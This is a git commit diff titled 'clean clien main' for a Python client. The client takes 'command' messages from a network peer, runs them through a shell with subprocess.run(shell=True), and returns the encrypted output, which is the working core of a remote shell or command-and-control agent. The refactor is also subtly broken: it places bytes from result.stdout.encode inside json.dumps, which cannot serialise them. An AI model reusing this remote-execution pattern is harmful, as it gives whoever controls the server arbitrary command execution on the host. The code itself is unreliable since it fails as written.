3b276fe018ebee8459f087b3a41502c9e7933685
Quentin Hélion <helion.quentin@gmail.com>
2024-06-18 15:30:03 +0200

    clean clien main

--- client/main.py
+++ client/main.py
@@ -45,33 +45,18 @@ def main():
 
 
             if data['type'] == 'command':
-                if system_os == 'Windows':
 
-                    command = data['action']
-                    result = subprocess.run(command)
-                    # result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                command = data['action']
+                result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
-                    response = json.dumps({
-                        'status': 'OK',
-                        'response': result.stdout
-                    }).encode('utf-8')
+                response = json.dumps({
+                    'status': 'OK',
+                    'response': result.stdout.encode('utf-8')
+                }).encode('utf-8')
 
-                    print(response)
+                print(response)
 
-                    conn.sendall(cipher.encrypt_message(response))
-                else:
-                    command = data['action']
-                    # result = subprocess.run(command)
-                    result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-
-                    response = json.dumps({
-                        'status': 'OK',
-                        'response': result.stdout
-                    }).encode('utf-8')
-
-                    print(response)
-
-                    conn.sendall(cipher.encrypt_message(response))
+                conn.sendall(cipher.encrypt_message(response))
 
             # response = cipher.encrypt_message(f"Commands received: {data['command']}")
             #conn.sendall(cipher.encrypt_message(response))
